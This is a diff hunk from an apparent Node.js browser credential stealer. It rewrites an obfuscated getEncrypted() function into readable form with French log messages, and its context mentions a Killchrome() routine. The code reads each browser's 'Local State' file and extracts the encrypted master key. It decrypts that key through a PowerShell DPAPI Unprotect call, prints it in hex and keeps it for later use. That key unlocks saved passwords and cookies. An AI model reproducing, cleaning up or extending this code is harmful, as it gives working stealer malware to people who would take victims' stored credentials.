@@ -2280,28 +2280,52 @@ async function Killchrome() {
 
 
 async function getEncrypted() {
-    for (let _0x4c3514 = 0; _0x4c3514 < browserPath.length; _0x4c3514++) {
-        if (!fs.existsSync('' + browserPath[_0x4c3514][0])) {
-            continue
+    for (let i = 0; i < browserPath.length; i++) {
+        if (!fs.existsSync(browserPath[i][0])) {
+            console.log(`Dossier introuvable: ${browserPath[i][0]}`);
+            continue;
         }
+
         try {
-            let _0x276965 = Buffer.from(
-                JSON.parse(fs.readFileSync(browserPath[_0x4c3514][2] + 'Local State'))
-                .os_crypt.encrypted_key,
-                'base64'
-            ).slice(5)
-            const _0x4ff4c6 = Array.from(_0x276965),
-                _0x4860ac = execSync(
-                    'powershell.exe Add-Type -AssemblyName System.Security; [System.Security.Cryptography.ProtectedData]::Unprotect([byte[]]@(' +
-                    _0x4ff4c6 +
-                    "), $null, 'CurrentUser')"
-                )
-                .toString()
-                .split('\r\n'),
-                _0x4a5920 = _0x4860ac.filter((_0x29ebb3) => _0x29ebb3 != ''),
-                _0x2ed7ba = Buffer.from(_0x4a5920)
-            browserPath[_0x4c3514].push(_0x2ed7ba)
-        } catch (_0x32406b) {}
+            const localStatePath = browserPath[i][2] + 'Local State';
+            if (!fs.existsSync(localStatePath)) {
+                console.log(`Fichier Local State introuvable: ${localStatePath}`);
+                continue;
+            }
+
+            console.log(`Lecture de ${localStatePath}`);
+            const localState = JSON.parse(fs.readFileSync(localStatePath, 'utf-8'));
+            if (!localState.os_crypt || !localState.os_crypt.encrypted_key) {
+                console.log(`Clé chiffrée manquante dans ${localStatePath}`);
+                continue;
+            }
+
+            const encryptedKey = Buffer.from(localState.os_crypt.encrypted_key, 'base64').slice(5);
+            const keyArray = Array.from(encryptedKey);
+
+            const output = execSync(
+                'powershell.exe Add-Type -AssemblyName System.Security; [System.Security.Cryptography.ProtectedData]::Unprotect([byte[]]@(' +
+                keyArray +
+                "), $null, 'CurrentUser')"
+            ).toString();
+
+            const decryptedKeyArray = output
+                .split('\r\n')
+                .filter(line => line !== '')
+                .map(Number); 
+
+            const decryptedKey = Buffer.from(decryptedKeyArray);
+
+            if (decryptedKey.length !== 32) {
+                console.error(`Clé invalide pour ${browserPath[i][0]}: longueur ${decryptedKey.length} (attendu 32)`);
+                continue;
+            }
+
+            console.log(`Clé déchiffrée pour ${browserPath[i][0]}:`, decryptedKey.toString('hex'));
+            browserPath[i].push(decryptedKey);
+        } catch (error) {
+            console.error(`Erreur lors de l'extraction de la clé pour ${browserPath[i][0]}:`, error.message);
+        }
     }
 }
 
